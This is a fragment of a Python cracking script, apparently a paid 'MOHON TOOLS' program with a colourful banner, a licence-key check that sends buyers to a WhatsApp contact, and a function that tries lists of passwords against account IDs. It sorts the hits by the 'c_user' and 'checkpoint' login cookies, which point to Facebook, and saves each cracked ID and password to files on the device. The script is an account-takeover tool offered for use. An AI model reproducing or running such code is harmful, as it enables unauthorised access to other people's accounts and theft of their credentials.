...
logo="""   \033[1;92m
    ...
    /:::/|::|   |           /:::/    \:::\    \       /:::/____/              /:::/    \:::\    \       /:::/|::|   |        
   /:::/ |::|   |          /:::/    / \:::\    \     /::::\    \             /:::/    / \:::\    \     /:::/ |::|   |        
  /:::/  |::|___|______   /:::/____/   \:::\____\   /::::::\    \   _____   /:::/____/   \:::\____\   /:::/  |::|   | _____  
 /:::/   |::::::::\    \ |:::|    |     |:::|    | /:::/\:::\    \ /\    \ |:::|    |     |:::|    | /:::/   |::|   |/\    \ 
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO MOHON TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m MOHON AHMED  
\033[1;32m[-] GITHUB    :\033[1;32m SORRY-😔
\033[1;32m[-] FACEBOOK  :\033[1;32m rm.mohon.01
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m MOHON\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m══════════════════════════════════════════')   
try:
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801314848631')
    exit()
class Main:
    def __init__(self):
        self.id = []
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sMOHON\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[MOHON-OK🌸] {uid}|{ps}")
                open('/sdcard/MOHON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[MOHON-CP💔] {uid}|{ps}")
                open('/sdcard/MOHON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
